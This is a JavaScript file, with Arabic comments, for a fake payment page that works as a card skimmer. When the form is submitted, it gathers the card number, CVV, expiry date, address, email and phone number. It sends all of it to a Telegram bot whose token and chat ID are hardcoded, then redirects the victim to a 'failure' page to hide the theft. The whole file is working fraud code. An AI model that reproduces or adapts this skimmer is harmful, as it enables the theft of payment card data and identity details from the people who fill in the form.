// تحديد أيقونة البطاقة بناءً على الأرقام المدخلة
document.getElementById('cardNumber').addEventListener('input', function() {
  const cardIcon = document.getElementById('cardIcon');
  const cardNumber = this.value;
  if (cardNumber.startsWith('4')) {
    cardIcon.textContent = '💳 Visa';
  } else if (cardNumber.startsWith('5')) {
    cardIcon.textContent = '💳 MasterCard';
  } else {
    cardIcon.textContent = '';
  }
});

// إرسال البيانات إلى بوت Telegram
document.getElementById('submitBtn').addEventListener('click', function() {
  const cardNumber = document.getElementById('cardNumber').value;
  const cvv = document.getElementById('cvv').value;
  const expiryDate = document.getElementById('expiryDate').value;
  const address = document.getElementById('address').value;
  const city = document.getElementById('city').value;
  const postalCode = document.getElementById('postalCode').value;
  const email = document.getElementById('email').value;
  const phone = document.getElementById('phone').value;

  const token = '7828666311:AAEPBPslulEfWXQ57hUDcQXM_2MRiwssR0o';
  const chatId = '7348925896';
  const message = `
    🛒 معلومات البطاقة:
    - رقم البطاقة: ${cardNumber}
    - CVV: ${cvv}
    - انتهاء البطاقة: ${expiryDate}
    - العنوان: ${address}, ${city}, ${postalCode}
    - البريد الإلكتروني: ${email}
    - الهاتف: ${phone}
  `;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  }).then(response => {
    if (response.ok) {
      alert('تم إرسال البيانات بنجاح!');
      window.location.href = 'failure.html';
    } else {
      alert('حدث خطأ أثناء الإرسال.');
    }
  });
});